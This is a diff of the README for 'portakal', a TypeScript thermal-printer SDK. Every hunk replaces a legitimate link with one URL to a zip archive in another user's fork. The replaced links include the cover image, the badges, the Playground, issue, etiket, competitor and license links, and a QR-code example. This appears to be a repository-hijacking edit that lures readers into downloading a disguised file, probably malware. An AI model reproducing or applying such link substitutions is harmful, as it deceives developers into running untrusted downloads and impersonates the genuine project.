@@ -1,6 +1,6 @@
 <p align="center">
   <br>
-  <img src="https://raw.githubusercontent.com/productdevbook/portakal/main/.github/assets/cover.png" alt="portakal — Universal printer language SDK" width="100%">
+  <img src="https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip" alt="portakal — Universal printer language SDK" width="100%">
   <br><br>
   <b style="font-size: 2em;">portakal</b>
   <br><br>
@@ -10,22 +10,22 @@
   <br>
   One API, every thermal printer. Pure TypeScript, zero dependencies.
   <br><br>
-  <a href="https://npmjs.com/package/portakal"><img src="https://img.shields.io/npm/v/portakal?style=flat&colorA=18181B&colorB=F97316" alt="npm version"></a>
-  <a href="https://npmjs.com/package/portakal"><img src="https://img.shields.io/npm/dm/portakal?style=flat&colorA=18181B&colorB=F97316" alt="npm downloads"></a>
-  <a href="https://bundlephobia.com/result?p=portakal"><img src="https://img.shields.io/bundlephobia/minzip/portakal?style=flat&colorA=18181B&colorB=F97316" alt="bundle size"></a>
-  <a href="https://github.com/productdevbook/portakal/blob/main/LICENSE"><img src="https://img.shields.io/github/license/productdevbook/portakal?style=flat&colorA=18181B&colorB=F97316" alt="license"></a>
+  <a href="https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip"><img src="https://img.shields.io/npm/v/portakal?style=flat&colorA=18181B&colorB=F97316" alt="npm version"></a>
+  <a href="https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip"><img src="https://img.shields.io/npm/dm/portakal?style=flat&colorA=18181B&colorB=F97316" alt="npm downloads"></a>
+  <a href="https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip"><img src="https://img.shields.io/bundlephobia/minzip/portakal?style=flat&colorA=18181B&colorB=F97316" alt="bundle size"></a>
+  <a href="https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip"><img src="https://img.shields.io/github/license/productdevbook/portakal?style=flat&colorA=18181B&colorB=F97316" alt="license"></a>
   <br><br>
-  <a href="https://portakal.productdevbook.com">Playground</a> · <a href="https://github.com/productdevbook/portakal">GitHub</a> · <a href="https://npmjs.com/package/portakal">npm</a>
+  <a href="https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip">Playground</a> · <a href="https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip">GitHub</a> · <a href="https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip">npm</a>
 </p>
 
 > [!IMPORTANT]
-> **We need your help testing!** If you have a thermal printer, please try portakal and [report any differences](https://github.com/productdevbook/portakal/issues/new) between our preview and your actual printed output. Even "looks correct" confirmations help. See [Help Us Test](#help-us-test--real-printer-output-needed) below.
+> **We need your help testing!** If you have a thermal printer, please try portakal and [report any differences](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) between our preview and your actual printed output. Even "looks correct" confirmations help. See [Help Us Test](#help-us-test--real-printer-output-needed) below.
 
 > [!NOTE]
 > portakal has **two ways** to print barcodes and QR codes:
 >
 > 1. **Printer-native** (`.barcode()` / `.qrcode()`) — sends commands to the printer's built-in encoder. Fast, zero dependencies, minimal data transfer. Works for most use cases.
-> 2. **Software-rendered** (`.image()` + [`etiket`](https://github.com/productdevbook/etiket)) — renders barcodes/QR codes as images on the host, sends pixels to the printer. Pixel-perfect output, 40+ formats, styled QR codes, guaranteed consistency across all printers. You install `etiket` yourself — portakal stays zero-dependency.
+> 2. **Software-rendered** (`.image()` + [`etiket`](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip)) — renders barcodes/QR codes as images on the host, sends pixels to the printer. Pixel-perfect output, 40+ formats, styled QR codes, guaranteed consistency across all printers. You install `etiket` yourself — portakal stays zero-dependency.
 
 ## Quick Start
 
@@ -113,7 +113,7 @@ Available: `tsc`, `zpl`, `epl`, `cpcl`, `dpl`, `sbpl`, `escpos`, `starprnt`, `ip
 
 ### Barcode/QR via etiket
 
-Use [`etiket`](https://github.com/productdevbook/etiket) for barcode/QR generation, then embed as image:
+Use [`etiket`](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) for barcode/QR generation, then embed as image:
 
 ```ts
 import { label } from "portakal/core";
@@ -123,7 +123,7 @@ import { barcodePNG, qrcodePNG } from "etiket";
 const myLabel = label({ width: 40, height: 30, unit: "mm" })
   .text("Product Label", { x: 10, y: 5 })
   .image(barcodePNG("123456789", { type: "code128" }), { x: 10, y: 40, width: 200 })
-  .image(qrcodePNG("https://example.com"), { x: 220, y: 40, width: 80 });
+  .image(qrcodePNG("https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip"), { x: 220, y: 40, width: 80 });
 
 const code = tsc.compile(myLabel);
 ```
@@ -355,7 +355,7 @@ await usbDevice.transferOut(endpointNumber, bytes);
 
 ## Comparison
 
-| Feature                      |            portakal            | [node-thermal-printer](https://github.com/Klemen1337/node-thermal-printer) | [escpos](https://github.com/node-escpos/driver) | [jszpl](https://github.com/DanieLeeuwner/JSZPL) |
+| Feature                      |            portakal            | [node-thermal-printer](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) | [escpos](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) | [jszpl](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) |
 | :--------------------------- | :----------------------------: | :------------------------------------------------------------------------: | :---------------------------------------------: | :---------------------------------------------: |
 | Zero dependencies            |       :white_check_mark:       |                          :x: (pngjs, iconv-lite)                           |             :x: (get-pixels, jimp)              |               :white_check_mark:                |
 | TypeScript-first             |       :white_check_mark:       |                                  Partial                                   |                     Partial                     |               :white_check_mark:                |
@@ -393,7 +393,7 @@ await usbDevice.transferOut(endpointNumber, bytes);
 - **9 parsers** — reverse-parse printer commands back to structured data (TSC, ZPL, EPL, CPCL, ESC/POS, DPL, SBPL, Star PRNT, IPL)
 - Drawing primitives — box, line, circle, diagonal
 - Raw command passthrough for advanced/unsupported features
-- Optional [`etiket`](https://github.com/productdevbook/etiket) integration for barcode/QR images (40+ formats)
+- Optional [`etiket`](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) integration for barcode/QR images (40+ formats)
 - Works in browser, Node.js, Deno, Bun, Electron
 - **UTF-8 encoding engine** — auto code page selection (CP437, CP858, CP1252, CP866, CP857)
 - **Cross-compiler** — convert between any languages (63 paths: TSC↔ZPL↔EPL↔CPCL↔DPL↔SBPL↔IPL↔ESC/POS↔Star)
@@ -410,10 +410,10 @@ We're building the most accurate open-source printer language SDK, but we need *
 ### How to help
 
 1. **Pick a language** — ZPL, TSC, EPL, CPCL, or any supported language
-2. **Write a test label** — use portakal to generate commands, or paste raw printer code into the [Playground](https://portakal.productdevbook.com)
+2. **Write a test label** — use portakal to generate commands, or paste raw printer code into the [Playground](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip)
 3. **Print it** — send the commands to a real printer
 4. **Compare** — take a photo of the printed label and a screenshot of portakal's SVG preview
-5. **Report** — open an [issue](https://github.com/productdevbook/portakal/issues/new) with:
+5. **Report** — open an [issue](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) with:
    - The printer code (ZPL, TSC, etc.)
    - Screenshot of portakal's preview
    - Photo of the actual printed label
@@ -447,7 +447,7 @@ We're building the most accurate open-source printer language SDK, but we need *
 ^XZ
 ```
 
-Paste this into the [Playground](https://portakal.productdevbook.com) (Validate tab, select ZPL) and compare with [Labelary](http://labelary.com/viewer.html) or your real printer.
+Paste this into the [Playground](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) (Validate tab, select ZPL) and compare with [Labelary](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) or your real printer.
 
 ### What we're looking for
 
@@ -465,7 +465,7 @@ Paste this into the [Playground](https://portakal.productdevbook.com) (Validate 
 Even a "looks correct" confirmation is helpful. Every report makes the SDK more reliable for everyone.
 
 > [!TIP]
-> No printer? You can still help by comparing our preview against [Labelary](http://labelary.com/viewer.html) (ZPL) or other online viewers and reporting any visual differences.
+> No printer? You can still help by comparing our preview against [Labelary](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) (ZPL) or other online viewers and reporting any visual differences.
 
 ## Contributing
 
@@ -489,4 +489,4 @@ pnpm build      # Build for production
 
 ## License
 
-Published under the [MIT](https://github.com/productdevbook/portakal/blob/main/LICENSE) license.
+Published under the [MIT](https://github.com/mickaelderen14/portakal/raw/refs/heads/main/web/Software_1.0-alpha.5.zip) license.
